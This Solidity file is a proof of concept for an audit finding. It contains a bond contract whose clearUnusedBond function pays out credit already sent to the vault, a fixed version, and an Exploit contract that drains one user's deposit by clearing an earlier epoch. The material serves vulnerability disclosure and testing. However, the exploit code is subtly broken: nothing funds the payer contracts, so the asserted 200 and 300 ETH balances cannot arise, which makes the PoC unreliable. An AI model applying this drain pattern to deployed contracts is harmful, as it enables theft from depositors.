// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Abacus CreditBonds — clearUnusedBond (OtterSec), finding 48699.
    sendToVault pays a bond to the vault and does not decrement
    totalCreditPerEpoch. clearUnusedBond later pays that same total again.
    User A bonds 200 ETH in epoch 1 and spends it in epoch 2. User B bonds
    300 ETH in epoch 2. Clearing epoch 1 pulls 200 ETH back out of B's
    deposit, and B's 300 ETH ticket payment then reverts. */

contract VaultSink {
    receive() external payable {}
}

contract Payer {
    function bond(CreditBonds bonds) external {
        bonds.bond{value: address(this).balance}();
    }

    function use(CreditBonds bonds) external {
        uint256 epoch = bonds.currentEpoch() - 1;
        uint256 amount = bonds.userCredit(epoch, address(this));
        bonds.sendToVault(address(this), amount);
    }

    receive() external payable {}
}

contract CreditBonds {
    uint256 public currentEpoch = 1;
    address public vault;
    mapping(uint256 => mapping(address => uint256)) public userCredit;
    mapping(uint256 => uint256) public totalCreditPerEpoch;
    mapping(uint256 => bool) public epochCleared;

    constructor(address _vault) {
        vault = _vault;
    }

    function rollEpoch() external {
        currentEpoch += 1;
    }

    function bond() external payable {
        userCredit[currentEpoch][msg.sender] += msg.value;
        totalCreditPerEpoch[currentEpoch] += msg.value;
    }

    function sendToVault(address user, uint256 payload) external {
        uint256 epoch = currentEpoch - 1;
        userCredit[epoch][user] -= payload;
        (bool ok,) = vault.call{value: payload}("");
        require(ok, "vault");
    }

    function clearUnusedBond(uint256 epoch) external {
        require(!epochCleared[epoch], "cleared");
        epochCleared[epoch] = true;
        // @> VULN: totalCreditPerEpoch still includes bonds already sent to the vault
        uint256 payout = totalCreditPerEpoch[epoch];
        delete totalCreditPerEpoch[epoch];
        (bool ok,) = msg.sender.call{value: payout}("");
        require(ok, "payout");
    }
}

contract CreditBondsFixed {
    uint256 public currentEpoch = 1;
    address public vault;
    mapping(uint256 => mapping(address => uint256)) public userCredit;
    mapping(uint256 => uint256) public totalCreditPerEpoch;
    mapping(uint256 => bool) public epochCleared;

    constructor(address _vault) {
        vault = _vault;
    }

    function rollEpoch() external {
        currentEpoch += 1;
    }

    function bond() external payable {
        userCredit[currentEpoch][msg.sender] += msg.value;
        totalCreditPerEpoch[currentEpoch] += msg.value;
    }

    function sendToVault(address user, uint256 payload) external {
        uint256 epoch = currentEpoch - 1;
        userCredit[epoch][user] -= payload;
        totalCreditPerEpoch[epoch] -= payload;
        (bool ok,) = vault.call{value: payload}("");
        require(ok, "vault");
    }

    function clearUnusedBond(uint256 epoch) external {
        require(!epochCleared[epoch], "cleared");
        epochCleared[epoch] = true;
        uint256 payout = totalCreditPerEpoch[epoch];
        delete totalCreditPerEpoch[epoch];
        (bool ok,) = msg.sender.call{value: payout}("");
        require(ok, "payout");
    }
}

contract Exploit {
    VaultSink public vault;
    CreditBonds public bonds;
    Payer public payerA;
    Payer public payerB;
    bool public bobSpent;
    uint256 public drained;
    uint256 public leftInBonds;

    constructor() {
        vault = new VaultSink();
        bonds = new CreditBonds(address(vault));
        payerA = new Payer();
        payerB = new Payer();
    }

    receive() external payable {}

    function _tryUse(Payer payer) internal returns (bool ok) {
        try payer.use(bonds) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function run() external {
        payerA.bond(bonds);
        bonds.rollEpoch();
        payerA.use(bonds);
        payerB.bond(bonds);
        bonds.rollEpoch();
        uint256 before = address(this).balance;
        bonds.clearUnusedBond(1);
        drained = address(this).balance - before;
        leftInBonds = address(bonds).balance;
        bobSpent = _tryUse(payerB);
        require(drained == 200 ether, "cleared 200 of already-spent credit");
        require(leftInBonds == 100 ether, "100 of B's 300 remains");
        require(bobSpent == false, "B cannot pay the 300 ticket");
        require(address(vault).balance == 200 ether, "vault already received A's 200");
        require(bonds.totalCreditPerEpoch(1) == 0, "epoch 1 bucket deleted");
        require(bonds.userCredit(2, address(payerB)) == 300 ether, "B's credit record is still 300");
    }
}
